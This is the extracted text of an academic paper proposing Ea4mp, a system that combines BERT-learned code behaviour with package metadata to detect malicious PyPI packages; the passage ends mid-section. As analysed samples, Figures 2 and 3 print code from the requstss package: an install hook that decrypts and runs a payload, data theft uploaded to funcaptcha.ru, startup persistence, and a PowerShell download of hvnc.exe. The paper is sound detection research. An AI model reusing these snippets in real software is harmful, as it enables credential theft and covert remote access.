      "  \"data\": \"1+1>2: Integrating Deep Code Behaviors with Metadata Features\\nfor Malicious PyPI Package Detection\\nXiaobing Sun\\nxbsun@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nXingan Gao\\nMX120230566@stu.yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nSicong Cao\\u2217\\nDX120210088@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nLili Bo\\u2020\\nlilibo@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nXiaoxue Wu\\nxiaoxuewu@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nKaifeng Huang\\nkaifengh@tongji.edu.cn\\nTongji University\\nShanghai, China\\nABSTRACT\\nPyPI,theofficialpackageregistryforPython,hasseenasurgeinthe\\nnumber of malicious package uploads in recent years. Prior studies\\nhave demonstrated the effectiveness of learning-based solutions\\nin malicious package detection. However,manually-crafted expert\\nrules are expensive and struggle to keep pace with the rapidly\\nevolving malicious behaviors, while deep features automatically\\nextractedfromcodearestillinaccurateincertaincases.Tomitigate\\nthese issues, in this paper, we propose Ea4mp, a novel approach\\nwhich integrates deep code behaviors with metadata features to\\ndetect malicious PyPI packages. Specifically, Ea4mp extracts code\\nbehavior sequences from all script files and fine-tunes a BERT\\nmodel to learn deep semantic features of malicious code. In addi-\\ntion,werealizethevalueofmetadatainformationandconstructan\\nensemble classifier to combine the strengths of deep code behavior\\nfeatures and metadata features for more effective detection. We\\nevaluatedEa4mpagainstthreestate-of-the-artbaselinesonanewly\\nconstructed dataset. The experimental results show that Ea4mp\\nimproves precision by 6.9%-24.6% and recall by 10.5%-18.4%. With\\nEa4mp, we successfully identified 119 previously unknown mali-\\nciouspackagesfromapoolof46,573newly-uploadedpackagesover\\na three-week period, and 82 out of them have been removed by the\\nPyPI official.\\nCCS CONCEPTS\\n\\u2022 Security and privacy\\u2192Malware and its mitigation.\\nKEYWORDS\\nOpen-Source Software, Malicious Packages, PyPI, BERT\\n*Sicong Cao is the corresponding author.\\n\\u2020Yunnan Key Laboratory of Software Engineering, Yunnan, China.\\nPermission to make digital or hard copies of all or part of this work for personal or\\nclassroom use is granted without fee provided that copies are not made or distributed\\nforprofitorcommercialadvantageandthatcopiesbearthisnoticeandthefullcitation\\non the first page. Copyrights for components of this work owned by others than the\\nauthor(s) must be honored. Abstracting with credit is permitted. To copy otherwise, or\\nrepublish,topostonserversortoredistributetolists,requirespriorspecificpermission\\nand/or a fee. Request permissions from permissions@acm.org.\\nASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA\\n\\u00a9 2024 Copyright held by the owner/author(s). Publication rights licensed to ACM.\\nACM ISBN 979-8-4007-1248-7/24/10\\nhttps://doi.org/10.1145/3691620.3695493\\nACM Reference Format:\\nXiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng\\nHuang. 2024. 1+1>2: Integrating Deep Code Behaviors with Metadata Fea-\\ntures for Malicious PyPI Package Detection. In39th IEEE/ACM Interna-\\ntional Conference on Automated Software Engineering (ASE \\u201924), October\\n27-November 1, 2024, Sacramento, CA, USA.ACM, New York, NY, USA,\\n12 pages. https://doi.org/10.1145/3691620.3695493\\n1 INTRODUCTION\\nThe Open-Source Software (OSS) supply chain is fragile due to in-\\nsufficient security safeguards. The recentXZ incident [25] gathered\\nwidespread attention in the open-source and cybersecurity com-\\nmunity, indicating the weakness of existing open-source software\\ninfrastructure.XZ is a widely used open-source data compression\\ntool integrated into Linux systems as part of theliblzma library.\\nThe attacker implants malicious code to corrupt the SSH server\\nprocess and hijack the SSH authentication function. The incident is\\njust the tip of the iceberg of security incidents in the open-source\\nsoftware supply chain in recent years. However, it also serves as a\\nwake-up call to developers that we need to pay close attention to\\nthe current state of security when using open-source software.\\nAs the most popular programming language [41], securing the\\nPython ecosystem is one of the top priorities. Python has become\\nthe go-to choice for many developers due to its simplicity and ease\\noflearning.AstheofficialpackageregistryforPython,PyPI(Python\\nPackage Index) [33] has flourished numerous packages and depen-\\ndencies, which have evolved rapidly. It serves as a major platform\\ntodistributePythonpackages.However,PyPIhasrecentlyreported\\nmultiple instances of supply chain poisoning (i.e., adversaries up-\\nload malicious packages to affect the downstream dependencies),\\nshedding light on the ongoing security challenges confronting the\\nplatform [21]. In response to the situation, the PyPI officials and\\nthe security experts have ramped up their efforts to fortify security\\nmeasures. However, as malicious packages grow in sophistication,\\nexisting measures become cost-ineffective.\\nTo detect malicious PyPI packages, a straightforward way is\\nstaticcodeanalysis,asrecentworks[40,50,14,43,1,24]do.Forex-\\nample,Amalfi[40]extracted11pre-definedfeatures( e.g.,APIcalls\\nand permission) from known malicious packages to train Machine\\nLearning (ML)-based classifiers. However, these manually-crafted\\nexpertrulesareexpensiveandstruggletokeeppacewiththerapidly\\n1159\\n2024 39th IEEE/ACM International Conference on Automated Software Engineering (ASE)\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nevolving malicious behaviors [21, 38]. What\\u2019s worse, the crafty at-\\ntackers may disperse malicious behaviors into different functions\\nor files [21, 50, 38]. As a result, limited feature sets fail to charac-\\nterize comprehensive malicious behaviors (i.e., network, process,o r\\ncode generationAPIs), leading to high false negatives. To overcome\\nthis limitation, Liang et al. [24] propose a new approach. They use\\nword embedding model [2] to learn semantic information from\\ncode and convert code behavior sequences into vectors. However,\\nthis word embedding model is only effective for shorter sequences\\nand cannot handle the longer sequences that represent the entire\\npackage. Moreover, when attackers upload a large number of mali-\\ncious packages to the PyPI, these packages form abnormal clusters.\\nThisrendersclusteringalgorithmsineffectiveatidentifyingoutliers,\\ncausing detection to fail. Zhang et al. [50] leverage the sequential\\ninformationfromtheentirepackagetoidentifymaliciouspackages\\nbyusingBERT[15].Thisapproachcanovercomethelimitationthat\\nclusteringalgorithmsareunabletodetectanomalousclusters.How-\\never, they still extracted the sequential information by manually\\ndefining the feature set.\\nIn contrast to purely static solutions, Maloss [17] incorporated\\nadditional metadata and dynamic analysis modules to detect mali-\\ncious PyPI, NPM, and RubyGems packages. Since dynamic analysis\\nis computationally intensive and time-consuming [7], making it\\nless suitable for daily scanning of large numbers of PyPI packages,\\nwe do not delve too deeply into dynamic analysis in this work.\\nHowever,theirfocusonmetadatainformationcaughtourattention.\\nThey noticed that information such as package names, versions,\\netc., would reveal the attacker\\u2019s attempts (to induce the victim to\\ndownload these malicious packages), so they used this metadata\\ninformation as part of their manually extracted feature set. Exper-\\niments proved that the metadata information effectively helped\\nthem detect some malicious packages that could not be detected\\nby code information alone. However, their analysis of metadata re-\\nmainslimitedtoafewsimplefeatureswithoutinvestigatingaspects\\nlike package descriptions and so on. By comparing thePKG-INFO\\n(which contains all metadata information about a Python pack-\\nage) of benign and malicious packages, we found that compared to\\nresponsibledevelopers,maliciousattackerstendtooverlookorran-\\ndomly input meaningless characters into fields like the description\\nandsummary.Inotherwords,wecaneasilyutilizethisinformation\\nto detect malicious packages.\\nTo address the above limitations, we propose a novel approach\\nEa4mp, which integrates deep code behavior features with meta-\\ndata features to detect malicious packages on PyPI. Specifically,\\nto avoid the intense labour of human experts on feature engineer-\\ning, we analyze all Python script files and automatically extract\\ndeep features from ordered code behavior sequences of malicious\\npackages via the BERT model. In addition, we realize the value of\\nmetadatainformationandconstructanensembleclassifierbasedon\\nAdaboost to combine the strengths of deep code behavior features\\nand metadata features for more effective detection.\\nTo verify the effectiveness of our proposed Ea4mp, we collected\\n3,404 malicious packages and 10,000 benign packages as the eval-\\nuation dataset and compared Ea4mp with three state-of-the-art\\n(VirusTotal, OSSGadget, and Bandit4Mal) baselines. The exper-\\nimental results show that Ea4mp improves precision by 6.9%-24.6%\\nand recall by 10.5%-18.4%. We also monitored 46,573 software pack-\\nages uploaded on PyPI between March 28 and April 18, 2024, 119\\nof which were malicious packages found by Ea4mp. We reported\\nthesepackagestoPyPIofficials,and82ofthemhavebeenremoved.\\nThe contributions of our paper are as follows:\\n\\u2022 We propose Ea4mp, a novel approach which combines the\\nstrengths of deep code behavior features and metadata features\\nfor malicious PyPI package detection.\\n\\u2022 We thoroughly analyzed 3,404 known malicious packages and\\nconstructed a comprehensive feature set of metadata.\\n\\u2022 Ea4mp has uncovered 119 previously unknown malicious pack-\\nages.WereportedthesepackagestoPyPIofficials,and82ofthem\\nhave been removed. Our dataset and source code are available at\\nhttps://github.com/ea4mp/ea4mp\\nPaper Organization.The remainder of this paper is organized as\\nfollows. Section 2 presents the background knowledge related to\\nour problem. Section 3 introduces the details about our proposed\\nEa4mp. Section 4 describes the experimental setup and reports the\\nresults. Section 5 presents an additional discussion of our approach.\\nSection 6 reviews the related work. Section 7 concludes this paper\\nand outlines our future research agenda.\\n2 BACKGROUND\\nInthissection,wedescribehowthesethreetypesofattacksaretrig-\\ngered and then introduce the principles and limitations of existing\\ndetection approaches and the motivation of our work.\\n2.1 Open Source Supply Chain\\nAs the software industry evolves, the conventional solitary devel-\\nopment model is progressively inadequate in meeting the escalat-\\ning complexity and the demands for swift iteration. To expedite\\ndevelopmentprocesses,curtailredundantlabour,manageR&D(Re-\\nsearch and Development) expenses, and stimulate technological\\ninnovation, software developers are transitioning towards a more\\nefficacious mode of collaboration-open-source cooperation. This\\nparadigm permits developers globally to exchange code, mutually\\nlearn, and collectively resolve issues, thereby significantly enhanc-\\ning the efficiency and calibre of software development. Within this\\ntrajectory,theOpen-SourceSoftware(OSS)supplychainisanindis-\\npensable component of contemporary software development [22].\\nThe OSS supply chain embodies a linear, deeply collaborative\\nsoftware production framework encompassing the entire gamut\\nfrom the inception, scrutiny, amalgamation, and testing to the dis-\\nseminationofsourcecode.Thissupplychainnotonlyencompasses\\nthe code itself but also encompasses an array of supportive infras-\\ntructure, including dependency management, continuous ensem-\\nble/continuous deployment (CI/CD) tools, code hosting platforms,\\nand automated testing frameworks\\nBased on the research reported by [35, 36, 37], the Open-source\\nSoftware supply chain is witnessing robust development. Over the\\npast three years, third-party dependency hosting repositories for\\nmajor programming languages have experienced rapid expansion.\\nFor instance, NPM [29] (Node Package Manager) has emerged as a\\ncornerstone for JavaScript developers, offering a vast repository of\\nover 2.3 million packages. Maven Central Repository [26] stands\\n1160\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA\\nRegistry\\nMirrors\\nOfficial \\nRegistry\\u07bdUpload\\n\\u07bfDownload\\nAttacker\\nDeveloper\\nManager\\nVe t \\u07c0\\n\\u07c1Request\\n\\u07c2Install Users\\n\\u07c4Import\\nLocal Registry\\n\\u07beUpload\\n\\u07c3Download\\nFigure 1: Threat model.\\nas the central hub for Java dependencies, facilitating seamless en-\\nsemble and management of libraries for Java projects. NuGet [30]\\nserves as the primary repository for .NET developers, providing a\\nrich ecosystem of packages for .NET applications and frameworks.\\nThe growth rates of these three major hosting platforms over the\\npastthreeyearshavereached98.3%,70.4%,and146.6%,respectively.\\n2.2 Threat Model\\nDifferent from vulnerabilities which are caused by poor security\\npractices [4], a software package is considered malicious if it is\\ndeveloped and distributed by attackers for malicious ends. They\\ngenerally contain malicious code deliberately inserted to perform\\nattacks, including infecting the target network, stealing and exfil-\\ntrating sensitive information such as passwords and credit card\\ninformation, and engaging in additional malicious activity done\\nby downloaded malware components. From the perspective of the\\ntiming of attacks on end-users by malicious packages, they can be\\ncategorizedintothreetypes:duringinstallation,duringimport,and\\nduring runtime. The structure of malicious packages that attack\\nat different stages varies greatly. For example, malicious packages\\nattackedatinstallationtimeoftenwritemaliciouscodedirectlyinto\\nthe setup.py script, while runtime attacks and import-time attacks\\nmay hide malicious code in other script files [21]. Therefore, it is\\nnecessarytoconductacomprehensiveanalysisofthesethreetypes\\nof attacks.\\nFigure 1 shows how malicious packages propagate through the\\nsoftware supply chain and ultimately impact victims. Attackers\\nupload packages (\\u0082) containing malicious code to PyPI and use\\nvarious techniques to evade administrators\\u2019 vet (\\u0085). Once these\\nmalicious packages are uploaded to PyPI, they start to spread due\\nto the synchronization feature of mirror sources, infecting multi-\\nple mirror sources. Developers, as a specific type of user, might\\ninadvertently download these malicious packages (\\u0083\\u0084 ). When\\nthese packages are incorporated into new development projects,\\nthe spread of the malicious packages further increases. For end\\nusers, upon sending arequest (\\u0086), PyPI automatically downloads\\n(\\u0088) the target package to the local registry and performs the instal-\\nlation (\\u0087). Some malicious scripts execute during the installation\\nprocess.Othersaremoresubtle,causingnoimmediateharmduring\\ninstallation but executing malicious scripts when the package is\\nimported (\\u0089). Even more covert packages hide malicious scripts\\nwithin functions, only triggering malicious actions when the user\\nruns the project. We have conducted a detailed analysis of the trig-\\ngering mechanisms for attacks occurring at these three different\\nstages.\\nMalicious behaviors at install time.Install-time attacks [46]\\noccurwhenusersdownloadandinstallmaliciouspackagesthrough\\npackage managers (e.g., pip, npm, gem,etc.). These attacks ex-\\nploit installation scripts that are automatically executed when the\\npackage is installed (e.g., scripts insetup.py or the scripts field in\\npackage.json). These malicious installation scripts may download\\nand execute malicious code from remote servers, modify system\\nconfiguration files, add backdoors, or create new users to gain sys-\\ntem access [8, 48]. They can also collect sensitive user information\\n(such as environment variables and configuration files) and send it\\nto servers controlled by the attacker.\\nMalicious behaviors at import time.Import-time attacks hap-\\npenwhenusersimportamaliciouspackageormoduleintheircode.\\nThese attacks take advantage of the code that is automatically exe-\\ncutedwhenthemoduleisimported.Boththerequiredstatementin\\nJavaScriptandtheimportstatementinPythoncantriggerthistype\\nof attack. When a malicious module is imported, its initialization\\ncode, which may contain malicious instructions, is executed imme-\\ndiately.Maliciouscodecancollectenvironmentinformationduring\\nimport, such as the operating system type and installed software\\nversions, and send this information to the attacker. Additionally,\\nmalicious modules can modify the behavior of other modules or\\nimplant backdoors in the system during import [49, 47].\\nMalicious behaviors at runtime.Runtime attacks occur during\\nthe execution of the program. These attacks utilize the code exe-\\ncuted by the malicious package at runtime to perform malicious\\noperations. Such attacks may not be triggered during installation\\nor import but are activated during specific function calls or events.\\nUnder certain conditions, the malicious code may execute prede-\\nfined malicious actions, such as deleting files, encrypting data, or\\nsending sensitive information. Malicious code can establish persis-\\ntencemechanismsatruntime,allowingittocontinuerunningeven\\nafter the system reboots while also hiding itself to avoid detection.\\nRuntime malicious code can open backdoors, enabling attackers to\\ncontrol the compromised system remotely.\\n2.3 Motivation\\nInthissection,weanalyzethesourcecodeandmetadataofanewly\\ndetected malicious package,requstss-1.0.0, that was reported\\nby [38]. We have derived two basic facts:\\nFinding 1: Malicious Code Behaviors Span Multiple Script\\nFiles and Exhibit inter-connections.As shown in Figure 2, the\\nattacker executes the malicious payload in thesetup() function\\nby callingGruppeInstall(). In line 4, the attacker first checks the\\nvictim\\u2019s runtime environment to evade most Linux-based dynamic\\nanalysis approaches, targeting only Windows users. In Figure 2\\n(b), line 6, the attacker uses theFernet function to encrypt the\\nmaliciouspayload.Afterdecryption,wediscoveredthattheattacker\\ndownloads files from a remote server and overwrites local files.\\nIf we only analyze thesetup.py script, it is actually difficult to\\nverify that this package exhibits malicious behavior. However, by\\n1161\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nclass GruppeInstall(install):\\ndef run(self):\\nif os.name == \\\"nt\\\":\\nfrom fernet import Fernet\\nexec(Fernet(b'EBjiyW0IuU6BYDGcO\\u2026').decrypt(b'gA\\nAAAABmA0bbhYYeLFxkKwlWInbw...'))\\ninstall.run(self)                \\n\\u2026\\nsetup(\\n...\\ncmdclass={\\n'install': GruppeInstall,\\n},\\npackages=find_packages(),\\nsetup_requires=['fernet', 'requests'],\\n...\\nrequests.get('https[:]//funcaptcha.ru/paste2?package=requstss').text.replace('<pre>','').replace('</pre>','')\\n(c) The Decrypt function in gruppe.py invoked from GruppeInstall in setup.py\\n(a) The setup function in setup.py (b) The GruppeInstall function in setup.py\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n1\\nFigure 2: Malicious code in the setup.py script of the\\nrequstss-1.0.0 package.\\nSTORAGE_PATH = APPDATA + \\\"\\\\\\\\gruppe_storage\\\"\\nSTARTUP_PATH = os.path.join(APPDATA, \\\"Microsoft\\\", \\n\\\"Windows\\\", \\\"Start Menu\\\", \\\"Programs\\\", \\\"Startup\\\")\\n...\\ndef upload_to_server(filepath):\\n...\\nurl = \\\"https://funcaptcha.ru/delivery\\\"\\nfiles = {'file': open(filepath, 'rb')}\\nr = requests.post(url, files=files)\\n...\\nfor browser in CHROMIUM_BROWSERS: ...\\nfor wallet_file in WALLET_PATHS: ...\\nfor discord_path in DISCORD_PATHS: ...\\nfor cookie in COOKIES:\\nzip_to_storage(f \\\"{browser['name']\\u2026}\\\", \\nextension_path, STORAGE_PATH)\\nfor file_to_upload in os.listdir(STORAGE_PATH):\\nupload_to_server(STORAGE_PATH + \\\"\\\\\\\\\\\" + \\nfile_to_upload)\\n...\\nURL = \\\"https://funcaptcha.ru/hvnc.py\\\"\\nr = requests.get(URL)\\nwith open(os.path.join(STARTUP_PATH, \\\"hvnc.py\\\"), \\n\\\"wb\\\") as f:\\nf.write(r.content)\\nscript =\\n\\\"\\\"\\\"\\n...\\npowershell -command \\\"(New-Object \\nSystem.Net.WebClient).DownloadFile('https://funcaptcha.ru/hvnc\\n.exe', '%temp_file%')\\\"\\nstart \\\"\\\" \\\"%temp_file%\\\"\\n\\\"\\\"\\\"\\nappdata = os.environ.get('APPDATA', '')\\nif appdata:\\n...\\nscript_path = os.path.join(appdata, 'Microsoft', 'runpython.py')\\nwith open(script_path, 'w') as script_file:\\nscript_file.write(script)\\nsubprocess.Popen(['python', script_path], \\ncreationflags=subprocess.CREATE_NO_WINDOW)\\n(a) gruppe.py (b) hvnc.py\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n13\\n14\\n15\\n16\\n17\\n18\\n19\\n20\\n21\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n13\\n14\\nFigure 3: Malicious code in the gruppe.py and hvnc.py script\\nof therequstss-1.0.0 package.\\nanalyzing other script files within the package, we found more evi-\\ndenceprovingthatthisisamaliciouspackage.AsshowninFigure3\\n(a),lines10-13,theattackerreadsalargeamountofthevictim\\u2019spri-\\nvatedata.Atline14,bycallingthe zip_to_storage() function,the\\nattacker packages the victim\\u2019s data and uploads it to the attacker\\u2019s\\nhost at line 16. Additionally, to continuously obtain the victim\\u2019s\\nprivate information, at line 2 of Figure 3 (a), the attacker reads\\nthe victim\\u2019s startup directory and, in lines 18-21, writes another\\nmalicious script,hvnc.py, into the startup items. After analyzing\\nthe hvnc.py script, we discovered that the attacker downloads the\\nhvnc.exe program from a remote host to the victim\\u2019s machine, en-\\nabling the persistent acquisition of the victim\\u2019s private data. It is\\nnot difficult to find that the attackers start to try to disassemble the\\nmalicious behaviors and disperse them into different files. These\\nmalicious behaviors always show inter-connections that cannot be\\ndescribed by a manually defined feature set.\\nAs demonstrated in the example above, the attacker distributed\\nthe attack code across at least three script files to achieve their\\nmalicious goals. In addition, the attacker also employs custom ma-\\nlicious functions to increase the difficulty of manually extracting\\nfeatures. Based on these findings, there is a need for a comprehen-\\nsive analysis of code packages that considers the propagation of\\ncode behavior across files in an automated manner without requir-\\ning manual feature extraction. Therefore, our approach performs\\ncall graph (CG) [5, 3] and control flow graph (CFG) extraction for\\nall the scripts of the PyPI package to be detected and expresses the\\nMetadata-V ersion:\\nName:\\nV ersion:\\nSummary: \\nHome-page:\\nAuthor:\\nAuthor-email: \\nDescription:\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n2.1\\nrequstss\\n1.0.0\\nYFqdzDnaUEbcMZA..\\nUNKNOWN\\nYZuWUeBS\\nUShwmeSTygg@gmail.com\\nQUIZGtjBPQapseaPxl\\u2026\\nFigure 4: Metadata in thePKG-INFO.\\nglobalcallingandbeingcalledrelationshipofeachfunctionineach\\nscript file using the form of a sequence.\\nFinding 2: Metadata contains a wealth of useful informa-\\ntion.Existing research has already highlighted that elements in-\\ncluding package name, version, and author name can positively\\ndetect malicious packages. However, ouranalysis revealed that,\\nbesides these three basic metadata elements, other information,\\nsuch as summary and description, can also expose the attacker. By\\nanalyzing the metadata of existing malicious packages, we found\\nthat metadata formats are relatively fixed and contain a wealth of\\ninformationaboutthepublishers.Previousworkanalyzedmetadata\\nbyextractingpackagenameandversionbasedonlyonthepackage\\nname, ignoring thePKG-INFO file, which contains a lot of metadata\\ninformation.Maliciousattackersoftenrevealtheirintentionsinthis\\nsection by, for instance, inputting random strings as the package\\ndescription or author name or deliberately hiding their identity.\\nWe also found this phenomenon is widespread among malicious\\npackages. As shown in Figure 4, we also comprehensively analyzed\\nthemetadataofthemaliciouspackagerequstss-1.0.0.Wenoticed\\nthat the way attackers fill out the metadata of malicious packages\\nsignificantly differs from that of regular developers. As shown in\\nlines 4 and 8, the attacker inputs long strings of random, invalid\\ncharacters from the keyboard to fill in the basic description infor-\\nmationofthepackage.Thesestringslackanysemanticinformation\\nand do not conform to human natural language norms, making\\nthem easily identifiable using existing approaches. We manually\\nanalyzed a large amount of malicious package metadata and de-\\nveloped a relatively comprehensive feature set. To transform the\\nmetadata information into feature vectors that can be processed by\\nthe model, we use 0, 1, 2, ... to discretize the metadata information\\n(e.g.,0meansthatthefiledoesnotcontainthatpieceofinformation,\\n1 means that the information is normal, 3 means that there is an\\nanomaly in that piece of information,etc.)\\nBy extracting these two types of information, we can analyze\\nthe PyPI packages to be detected in a very comprehensive way.\\nHowever, we also note that these two kinds of information are\\ncompletely different; one is a sequence of code behaviors that need\\nto be preprocessed by the model to be correctly identified by the\\nmodel, while the other is a discretized feature vector that can eas-\\nily be used to train the model. Therefore, we process these two\\nkinds of information separately. Large language model fine-tuning\\nis performed using code behavior sequences. For metadata feature\\nvectors, we compare different machine learning models (including\\nNaive Bayes, decision tree, random forest, and support vector ma-\\nchine), as shown in Section 4.4 Naive Bayes and Random Forest\\nperformed better than any of the other models. Finally, to provide\\n1162\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA\\nCode Behavior Sequence-based Model Fine-tuning\\nMetadata Features Vector-based Model Training\\nSequence Generation \\n& Segmentation\\nTraining Dataset\\nTarget Packages\\nBenign Package\\nMalicious Package\\nFine-tuning\\nFeature Extraction & \\nDiscretization\\nTraining Machine \\nLearning Model\\nCode Behavior Sequences \\nMetadata Feature Vectors\\nModel Ensemble\\nSource code\\nMetadata\\nFigure 5: The overview of Ea4mp.\\na comprehensive consideration of code behavior sequences and\\nmetadata feature vectors, we ensemble the large language model\\nand the machine learning model using the AdaBoost algorithm.\\nCodebehaviorsequencesandmetadatafeaturevectorsareliketwo\\nmillstones that crush the malicious packages.\\n3 METHODOLOGY\\nThe workflow of Ea4mp is described in Figure 5 mainly consists of\\nthefollowingthreesteps. Step1:CodeBehaviorSequence-based\\nModel Fine-tuning.First, we extracted code behavior sequences\\nbased on CG and CFG for all script files in the PyPI package to\\nbe detected. The extracted code behavior sequences will be sliced,\\nlabelled, and then fed into the BERT model for fine-tuning.Step\\n2: Metadata Features Vector-based Model Training.We ex-\\ntract features from thePKG-INFO file and discretize the extracted\\nfeatures. The discretized feature vectors are then input into the ma-\\nchine learning models for training.Step 3: Model Ensemble.We\\nensemblethefine-tunedBERTmodelandthewell-trainedmachine\\nlearning model using the Adaboost algorithm to obtain our final\\nensemble approach.\\n3.1 Code Behavior Sequence-based Model\\nFine-tuning\\nCode behavior sequences extraction and segmentation.Fol-\\nlowing [24], We training a FastText [2] model with word embed-\\ndings and use this model to sort the depth-first traversal sequences\\noftheCG.Then,basedonthesorteddepth-firsttraversalsequences\\nand the CFG, we extract canonical code behavior sequences. Since\\nour approach analyzes entire software packages, the extracted se-\\nquences are often very long. The BERT model, however, limits the\\ninput sequence to a maximum of 512 tokens. Therefore, we need\\nto segment the extracted sequences. As shown in Figure 6, we find\\nthat the sequence of code behaviors is stitched together from the\\ncode sequences of the individual functions in each py file. For ex-\\nample,segmentation1containsthecodesequencesofthefunctions\\n(__init__), (iter), (minor_iter), etc.from the file A. In order to satisfy\\nthe model\\u2019s restriction on token length, we have to segment the\\nsequence. First we add the[CLS] tag at the beginning of the whole\\nsequence to remind the model that this is a new sequence, then we\\nscanthetokenlengthofeachfunctionsequence,andifthelengthof\\nthe segmentation is no more than 512 tokens, we add the function\\nsequence to the segmentation, as shown in the figure, when we\\n[CLS]\\n(A.__init__): <builtin>.super __init__ \\n(A.iter): numpy.array <call> .array <call>FistaSolver.proximal_gradient_line_search\\n<call>FistaSolver.proximal_gradient_line_search\\n(A.minor_iter):<builtin>.abs numpy.linalg.norm <builtin>.abs numpy.tensordot numpy.tensordot\\n\\u2026\\u2026\\n[SEP]\\n(C.print_header): <builtin>.print \\n(C. disp): <builtin>.len <builtin>.max format <builtin>.print \\n(D.compute_optdes_crit): <call>SLassoSolver.compute_information_matrix numpy.linalg.lstsqdot \\ndual_value append append ravel ravel dot \\n\\u2026\\u2026\\n[SEP]\\n\\u2026\\n[SEP]\\n(X.compute_tstar_screening_vec): <call>...compute_optdes_crit dot numpy.linalg.norm <builtin>.range \\n<builtin>.max dot numpy.linalg.inv numpy.linalg.inv dot dot numpy.atleast_2d numpy.linalg.norm\\nnumpy.tensordot numpy.eye dot <call>...min_dim1 append ravel numpy.linalg.lstsq ravel dot numpy.array\\ndot numpy.linalg.norm numpy.linalg.norm <builtin>.range <builtin>.max ravel ravel dot \\n[SEP] , LABEL=0\\nSegmentation 1\\nSegmentation 2\\nSegmentation N\\n\\u7016\\nFigure 6: Code behavior sequence example.\\nscan to the(print_header) function in the file C, the token length of\\nthe previous segmentation has exceeded 512, so we add the[SEP]\\ntag in front of(print_header) as a separator to remind the model\\nthat this is a new segmentation. This loops until the last function,\\nthe sequence from the(compute_tstar_screening_vec) function in\\nthe file X, is added to the segmentation N, and we add the[SEP]\\ntag at the end to indicate that this is the end of the entire sequence.\\nFinally, we append aLABEL tag at the end to indicate whether the\\nsequence comes from malicious (1) or benign (0) samples.\\nFine-tuning BERT model.By leveraging its inherent pooling\\nlayer, BERT can conduct weighted average pooling across vari-\\nous segments of lengthy texts, guided by manually assigned labels\\n(such as[SEP]). This feature facilitates the aggregation of infor-\\nmation from multiple segments, thereby enhancing the model\\u2019s\\ncapability to comprehend extensive textual inputs. This effectively\\naddresses the inconvenience caused by the token length limitation.\\nThe labeled sequences are then fed into a pre-trained BERT model.\\nDuring this stage, the model is fine-tuned to adapt to the specific\\ncharacteristics of the standardized code behavior sequences. Fine-\\ntuning involves adjusting the pre-trained model\\u2019s weights based\\non the newly labelled data, allowing BERT to learn patterns and\\nfeatures specific to the task. This step ensures that the fine-tuned\\nBERTmodelaccuratelyclassifiesthesequences,leveragingtherich\\ncontextual representations learned during pre-training.\\n1163\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE \\u201924, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nTable 1: The feature set of metadata\\nType Feature Description\\nPackage info Package Size Size\\nPackage Name Similarity to popular packages\\nVersion Metadata Version Whether the version number is abnormal\\nPackage Version Whether the version number is abnormal\\nAuthor information\\nAuthor Name Whether the author has ever published a malware package\\nHome Page Whether the author publishes the homepage of the package\\nAuthor Email Whether the author publishes the email\\nDescription Summary The summary is consistent with the package content\\nDescription The description is consistent with the package content\\n3.2 Metadata Features Vector-based Model\\nTraining\\nTable 1 shows the nine feature sets we selected for metadata and\\nthe criteria for discretizing them. Since PyPI automatically gener-\\nates metadata files during the Python package distribution process\\nand saves all metadata information in the PKG-INFO file, we have\\nchosenthePKG-INFOfileasthesourceforextractingourmetadata\\nfeature set and after a detailed manual analysis of the metadata of\\ncollected malicious packages, we identified nine types of metadata\\nfeatures. Considering that the Naive Bayes model can only handle\\ndiscrete data, we categorized the features based on their character-\\nistics to meet the requirements of subsequent model training.\\nPackage Size and Name.Package names and sizes play a crucial\\nrole in detecting malicious packages. Attackers often use names\\nsimilar to popular packages to confuse users and trick them into\\ndownloading malicious software. This strategy increases the likeli-\\nhood of malicious packages being downloaded through phishing\\nattacks and typosquatting [27]. Package size is also a key feature,\\nas malicious packages are typically smaller because they usually\\ncontainsimplescriptsforexecutingmaliciousactivitiesratherthan\\ncomplex functionalities. In our collected dataset (described in Sec-\\ntion4.1.1),2,826maliciouspackages(83.02%)aresmallerthan10KB\\nin size, 562 (16.51%) are larger than 10KB but smaller than 1MB,\\nand only 4 (0.12%) are larger than 10MB.\\nTo determine whether the package to be detected misled users\\nto download by disguising its own package name as the popular\\npackage name, we selected the packages with more than 100,000\\ndownloads on PyPI as the popular package and calculated the sim-\\nilarity between the to-be-detected PyPI package\\u2018s name and the\\npopular package name by using edit distance. We discretize the\\npackage name similarity using the numbers 1-10, where 10 means\\nthe similarity is greater than 90% 